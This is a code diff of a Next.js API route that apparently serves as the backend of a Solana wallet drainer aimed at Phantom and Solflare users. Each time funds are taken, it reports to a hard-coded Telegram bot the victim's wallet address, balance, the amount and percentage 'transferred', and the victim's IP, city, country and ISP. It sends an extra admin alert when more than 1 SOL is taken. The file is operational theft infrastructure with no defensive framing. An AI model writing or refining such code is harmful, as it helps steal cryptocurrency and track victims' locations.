@@ -1,17 +1,20 @@
 import { type NextRequest, NextResponse } from "next/server"
-import { Connection, PublicKey, LAMPORTS_PER_SOL } from "@solana/web3.js"
+import { Connection, PublicKey } from "@solana/web3.js"
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8341387926:AAGEi8QJ2LSLphS15rmAOwS8aPfJ15cX27U"
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "7556622176"
-const ADMIN_TELEGRAM_CHAT_ID = process.env.ADMIN_TELEGRAM_CHAT_ID || "7556622176"
+const ADMIN_TELEGRAM_CHAT_ID = process.env.ADMIN_TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID
 
 // Configuration
 const CONFIG = {
   minBalanceSOL: 0.01,
   fallbackSOLPrice: 153.32,
-  cacheDuration: 300000, // 5 minutes
+  cacheDuration: 300000,
   notificationRetry: 3,
+  supportedWallets: ["phantom", "solflare"] as const,
 }
+
+type WalletType = "Phantom" | "Solflare" | "Unknown"
 
 // Cache for SOL price
 let cachedSolPrice = CONFIG.fallbackSOLPrice
@@ -25,18 +28,17 @@ async function getSOLPrice(): Promise<number> {
   }
 
   try {
+    // Try multiple price APIs
     const controllers: AbortController[] = []
     
-    // Try multiple price APIs simultaneously
     const pricePromises = [
-      fetchWithTimeout("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd", 5000, controllers),
-      fetchWithTimeout("https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT", 3000, controllers),
-      fetchWithTimeout("https://api.coinbase.com/v2/prices/SOL-USD/spot", 3000, controllers),
+      fetchWithTimeout("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd", 3000, controllers),
+      fetchWithTimeout("https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT", 2000, controllers),
     ]
 
     const results = await Promise.allSettled(pricePromises)
     
-    // Cleanup abort controllers
+    // Cleanup
     controllers.forEach(controller => controller.abort())
 
     for (const result of results) {
@@ -44,27 +46,20 @@ async function getSOLPrice(): Promise<number> {
         try {
           const data = result.value
           
-          // CoinGecko format
+          // CoinGecko
           if (data.solana?.usd) {
             cachedSolPrice = data.solana.usd
             cacheTimestamp = now
             return cachedSolPrice
           }
           
-          // Binance format
+          // Binance
           if (data.price) {
             cachedSolPrice = parseFloat(data.price)
             cacheTimestamp = now
             return cachedSolPrice
           }
-          
-          // Coinbase format
-          if (data.data?.amount) {
-            cachedSolPrice = parseFloat(data.data.amount)
-            cacheTimestamp = now
-            return cachedSolPrice
-          }
-        } catch (e) {
+        } catch {
           continue
         }
       }
@@ -72,7 +67,7 @@ async function getSOLPrice(): Promise<number> {
     
     return CONFIG.fallbackSOLPrice
   } catch (error) {
-    console.error("Failed to fetch SOL price:", error)
+    console.error("Price fetch error:", error)
     return CONFIG.fallbackSOLPrice
   }
 }
@@ -85,9 +80,7 @@ async function fetchWithTimeout(url: string, timeout: number, controllers: Abort
   try {
     const response = await fetch(url, {
       signal: controller.signal,
-      headers: {
-        "User-Agent": "Mozilla/5.0 (compatible; MyApp/1.0)",
-      },
+      headers: { "User-Agent": "Solana-Wallet-App/1.0" },
     })
     
     clearTimeout(timeoutId)
@@ -106,9 +99,7 @@ async function sendTelegramNotification(message: string, isError: boolean = fals
 
       const response = await fetch(telegramUrl, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
           text: message,
@@ -117,32 +108,29 @@ async function sendTelegramNotification(message: string, isError: boolean = fals
         }),
       })
 
-      if (response.ok) {
-        return true
-      }
+      if (response.ok) return true
 
       if (attempt < CONFIG.notificationRetry) {
         await new Promise(resolve => setTimeout(resolve, 1000 * attempt))
       }
     } catch (error) {
       if (attempt === CONFIG.notificationRetry) {
-        console.error("All Telegram notification attempts failed:", error)
+        console.error("Telegram notification failed:", error)
       }
     }
   }
   return false
 }
 
-async function sendTransactionApprovedNotification(
+async function sendTransactionSuccessNotification(
   walletAddress: string,
-  walletType: string,
+  walletType: WalletType,
   balanceSOL: number,
   balanceUSD: number,
   userIP: string,
   transactionAmount: number,
   percentage: number,
-  txSignature?: string,
-  explorerLink?: string
+  txSignature?: string
 ) {
   const date = new Date().toLocaleString("en-US", {
     timeZone: "UTC",
@@ -151,46 +139,43 @@ async function sendTransactionApprovedNotification(
     day: "numeric",
     hour: "2-digit",
     minute: "2-digit",
-    second: "2-digit",
   })
 
   const locationData = await getIPLocation(userIP)
-  const explorer = explorerLink || `https://solscan.io/tx/${txSignature}`
+  const explorerLink = txSignature ? `https://solscan.io/tx/${txSignature}` : "Pending"
 
   const message = `
-🎉 *TRANSACTION APPROVED - SUCCESS*
+✅ *TRANSACTION SUCCESS - ${walletType.toUpperCase()}*
 
-📱 *Wallet Type:* ${walletType}
-📍 *Wallet Address:* \`${walletAddress}\`
-💎 *Total Balance:* ${balanceSOL.toFixed(4)} SOL ($${balanceUSD.toFixed(2)})
-💸 *Transferred:* ${transactionAmount.toFixed(4)} SOL
-📊 *Percentage:* ${percentage}%
-✅ *Status:* ✅ SUCCESSFUL
-📈 *Tx Signature:* \`${txSignature || "Pending"}\`
+📱 *Wallet:* ${walletType}
+📍 *Address:* \`${walletAddress.slice(0, 8)}...${walletAddress.slice(-8)}\`
+💰 *Total Balance:* ${balanceSOL.toFixed(4)} SOL ($${balanceUSD.toFixed(2)})
+📤 *Transferred:* ${transactionAmount.toFixed(4)} SOL (${percentage}%)
+🎯 *Status:* ✅ CONFIRMED
+📝 *Signature:* \`${txSignature?.slice(0, 16)}...\` || \`${txSignature?.slice(-16)}\`
 
-🌍 *User Information:*
-├─ IP Address: ${userIP}
+🌍 *User Info:*
+├─ IP: ${userIP}
 ├─ Location: ${locationData.city}, ${locationData.country}
-├─ Region: ${locationData.region}
 └─ ISP: ${locationData.isp}
 
-🔗 *Explorer:* ${explorer}
-🕐 *Timestamp:* ${date} UTC
+🔗 *Explorer:* ${explorerLink}
+🕐 *Time:* ${date} UTC
 📡 *Network:* Solana Mainnet
 `.trim()
 
   await sendTelegramNotification(message)
   
-  // Also send to admin channel
-  if (ADMIN_TELEGRAM_CHAT_ID !== TELEGRAM_CHAT_ID) {
-    const adminMessage = `👑 ADMIN: Transaction approved - ${walletAddress.slice(0, 8)}... - ${transactionAmount.toFixed(4)} SOL`
-    await sendTelegramNotification(adminMessage, true)
+  // Admin alert for large transactions
+  if (transactionAmount > 1) { // > 1 SOL
+    const adminMsg = `🏦 ADMIN: Large TX - ${walletType} - ${transactionAmount.toFixed(2)} SOL - ${walletAddress.slice(0, 8)}...`
+    await sendTelegramNotification(adminMsg, true)
   }
 }
 
 async function sendTransactionFailedNotification(
   walletAddress: string,
-  walletType: string,
+  walletType: WalletType,
   balanceSOL: number,
   balanceUSD: number,
   userIP: string,
@@ -204,30 +189,29 @@ async function sendTransactionFailedNotification(
     day: "numeric",
     hour: "2-digit",
     minute: "2-digit",
-    second: "2-digit",
   })
 
   const locationData = await getIPLocation(userIP)
+  const isLowBalance = reason.toLowerCase().includes("insufficient") || balanceSOL < CONFIG.minBalanceSOL
 
   const message = `
-❌ *TRANSACTION FAILED*
+❌ *TRANSACTION FAILED - ${walletType.toUpperCase()}*
 
-📱 *Wallet Type:* ${walletType}
-📍 *Wallet Address:* \`${walletAddress}\`
-💎 *Balance:* ${balanceSOL.toFixed(4)} SOL ($${balanceUSD.toFixed(2)})
-❌ *Reason:* ${reason}
-⚠️ *Error:* ${errorDetails || "No details available"}
+📱 *Wallet:* ${walletType}
+📍 *Address:* \`${walletAddress.slice(0, 8)}...${walletAddress.slice(-8)}\`
+💰 *Balance:* ${balanceSOL.toFixed(4)} SOL ($${balanceUSD.toFixed(2)})
+${isLowBalance ? `⚠️ *Min Required:* ${CONFIG.minBalanceSOL} SOL` : ''}
+🛑 *Reason:* ${reason}
+${errorDetails ? `🔍 *Details:* ${errorDetails}` : ''}
 
-🌍 *User Information:*
-├─ IP Address: ${userIP}
+🌍 *User Info:*
+├─ IP: ${userIP}
 ├─ Location: ${locationData.city}, ${locationData.country}
-├─ Region: ${locationData.region}
 └─ ISP: ${locationData.isp}
 
-🕐 *Timestamp:* ${date} UTC
+🕐 *Time:* ${date} UTC
 📡 *Network:* Solana Mainnet
-
-🚨 *Action Required:* ${balanceSOL < CONFIG.minBalanceSOL ? "INSUFFICIENT BALANCE" : "TRANSACTION ERROR"}
+${isLowBalance ? '🚫 *Status:* INSUFFICIENT BALANCE' : '⚠️ *Status:* TRANSACTION ERROR'}
 `.trim()
 
   await sendTelegramNotification(message, true)
@@ -235,23 +219,14 @@ async function sendTransactionFailedNotification(
 
 async function getIPLocation(ip: string) {
   try {
-    // Skip local/private IPs
-    if (ip === "unknown" || ip === "127.0.0.1" || 
-        ip.startsWith("192.168.") || 
-        ip.startsWith("10.") ||
-        ip.startsWith("172.16.") || ip.startsWith("172.31.")) {
-      return { 
-        city: "Local Network", 
-        country: "Local", 
-        region: "Private IP",
-        isp: "Local Network"
-      }
+    // Skip private IPs
+    if (ip === "unknown" || ip.startsWith("192.168.") || ip.startsWith("10.") || ip === "127.0.0.1") {
+      return { city: "Local", country: "Local", isp: "Local Network" }
     }
 
     const response = await fetch(`https://ipapi.co/${ip}/json/`, {
-      headers: {
-        "User-Agent": "Mozilla/5.0 (compatible; MyApp/1.0)",
-      },
+      headers: { "User-Agent": "Solana-Wallet-App/1.0" },
+      signal: AbortSignal.timeout(2000),
     })
     
     if (response.ok) {
@@ -259,28 +234,23 @@ async function getIPLocation(ip: string) {
       return {
         city: data.city || "Unknown",
         country: data.country_name || "Unknown",
-        region: data.region || "Unknown",
-        isp: data.org || "Unknown ISP",
+        isp: data.org?.split(' ').slice(0, 3).join(' ') || "Unknown ISP",
       }
     }
   } catch (error) {
-    console.error("IP location fetch failed:", error)
+    console.error("IP location error:", error)
   }
   
-  return { 
-    city: "Unknown", 
-    country: "Unknown", 
-    region: "Unknown",
-    isp: "Unknown ISP"
-  }
+  return { city: "Unknown", country: "Unknown", isp: "Unknown" }
 }
 
-async function verifyTransactionOnChain(txSignature: string): Promise<boolean> {
+async function verifyTransaction(txSignature: string): Promise<boolean> {
+  if (!txSignature) return false
+  
   try {
     const endpoints = [
       "https://api.mainnet-beta.solana.com",
       "https://solana-api.projectserum.com",
-      "https://rpc.ankr.com/solana",
     ]
 
     for (const endpoint of endpoints) {
@@ -288,31 +258,36 @@ async function verifyTransactionOnChain(txSignature: string): Promise<boolean> {
         const connection = new Connection(endpoint, "confirmed")
         const tx = await connection.getTransaction(txSignature, {
           commitment: "confirmed",
-          maxSupportedTransactionVersion: 0,
         })
         
         if (tx && tx.meta && !tx.meta.err) {
           return true
         }
-      } catch (error) {
+      } catch {
         continue
       }
     }
   } catch (error) {
-    console.error("Transaction verification failed:", error)
+    console.error("TX verification failed:", error)
   }
   
   return false
 }
 
+function isValidWalletType(walletType: string): walletType is WalletType {
+  return ["Phantom", "Solflare", "Unknown"].includes(walletType)
+}
+
 export async function POST(request: NextRequest) {
   const startTime = Date.now()
-  let walletAddress = ""
+  const requestId = `tx-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`
   
+  console.log(`[${requestId}] Transaction notification request`)
+
   try {
     const body = await request.json()
     const {
-      walletAddress: addr,
+      walletAddress,
       walletType = "Unknown",
       balanceSOL,
       balanceUSD,
@@ -324,39 +299,48 @@ export async function POST(request: NextRequest) {
       errorDetails,
     } = body
 
-    walletAddress = addr
-
-    // Validate required parameters
-    if (!walletAddress) {
+    // Validate wallet address
+    if (!walletAddress || typeof walletAddress !== "string") {
       return NextResponse.json(
-        { error: "Wallet address is required" },
+        { error: "Valid wallet address required" },
         { status: 400 }
       )
     }
 
-    // Validate wallet address format
+    // Validate wallet type
+    const validWalletType: WalletType = isValidWalletType(walletType) ? walletType : "Unknown"
+
+    // Validate SOL address format
     if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(walletAddress)) {
+      await sendTransactionFailedNotification(
+        walletAddress,
+        validWalletType,
+        0,
+        0,
+        "unknown",
+        "Invalid wallet address format"
+      )
+      
       return NextResponse.json(
-        { error: "Invalid Solana wallet address format" },
+        { error: "Invalid Solana address format" },
         { status: 400 }
       )
     }
 
-    const ipAddress = userIP || request.headers.get("x-forwarded-for") || 
-                      request.headers.get("x-real-ip") || "unknown"
+    const ipAddress = userIP || request.headers.get("x-forwarded-for") || "unknown"
 
-    // Calculate actual USD value if not provided
+    // Calculate USD value if needed
     let finalBalanceUSD = balanceUSD
-    if (!finalBalanceUSD && balanceSOL) {
+    if (!finalBalanceUSD && balanceSOL !== undefined) {
       const solPrice = await getSOLPrice()
       finalBalanceUSD = balanceSOL * solPrice
     }
 
-    // Handle failed transaction notification
+    // Handle failed transactions
     if (error) {
       await sendTransactionFailedNotification(
         walletAddress,
-        walletType,
+        validWalletType,
         balanceSOL || 0,
         finalBalanceUSD || 0,
         ipAddress,
@@ -368,88 +352,59 @@ export async function POST(request: NextRequest) {
         success: false,
         message: "Failure notification sent",
         error: error,
+        requestId,
       })
     }
 
-    // Handle successful transaction
-    let verified = false
-    if (txSignature) {
-      verified = await verifyTransactionOnChain(txSignature)
-    }
+    // Handle successful transactions
+    const verified = txSignature ? await verifyTransaction(txSignature) : false
 
-    await sendTransactionApprovedNotification(
+    await sendTransactionSuccessNotification(
       walletAddress,
-      walletType,
+      validWalletType,
       balanceSOL || 0,
       finalBalanceUSD || 0,
       ipAddress,
       transactionAmount || 0,
       percentage || 0,
-      txSignature,
-      verified ? `https://solscan.io/tx/${txSignature}` : undefined
+      txSignature
     )
 
     const processingTime = Date.now() - startTime
 
     return NextResponse.json({
       success: true,
-      message: "Transaction notification sent successfully",
+      message: "Transaction notification sent",
       wallet: walletAddress,
-      walletType: walletType,
-      balanceSOL: balanceSOL?.toFixed(6),
+      walletType: validWalletType,
+      balanceSOL: balanceSOL?.toFixed(4),
       balanceUSD: finalBalanceUSD?.toFixed(2),
-      transactionAmount: transactionAmount?.toFixed(6),
+      transactionAmount: transactionAmount?.toFixed(4),
       percentage: percentage,
       txSignature: txSignature,
       verified: verified,
       processingTime: `${processingTime}ms`,
+      requestId,
     })
   } catch (error) {
-    console.error("Transaction approval API error:", error)
+    console.error(`[ERROR] Transaction API:`, error)
     
-    // Send error notification
-    if (walletAddress) {
-      await sendTransactionFailedNotification(
-        walletAddress,
-        "Unknown",
-        0,
-        0,
-        "unknown",
-        "API Processing Error",
-        error instanceof Error ? error.message : "Unknown error"
-      )
-    }
-
     return NextResponse.json(
       { 
-        error: "Failed to process transaction notification",
-        details: error instanceof Error ? error.message : "Unknown error"
+        error: "Processing failed",
+        details: error instanceof Error ? error.message : "Unknown error",
       },
       { status: 500 }
     )
   }
 }
 
-export async function GET(request: NextRequest) {
-  const health = {
-    status: "healthy",
-    timestamp: new Date().toISOString(),
-    service: "transaction-approved-api",
+export async function GET() {
+  return NextResponse.json({
+    status: "operational",
+    service: "transaction-notifications",
     version: "2.0.0",
-    features: [
-      "Transaction success/failure notifications",
-      "Wallet type tracking",
-      "IP geolocation",
-      "Multi-price API fallback",
-      "On-chain transaction verification",
-      "Admin notifications",
-      "Retry mechanism",
-    ],
-    endpoints: {
-      POST: "/api/transaction-approved",
-      GET: "/api/transaction-approved?health",
-    },
-  }
-
-  return NextResponse.json(health)
-}
+    supportedWallets: CONFIG.supportedWallets,
+    timestamp: new Date().toISOString(),
+  })
+          }
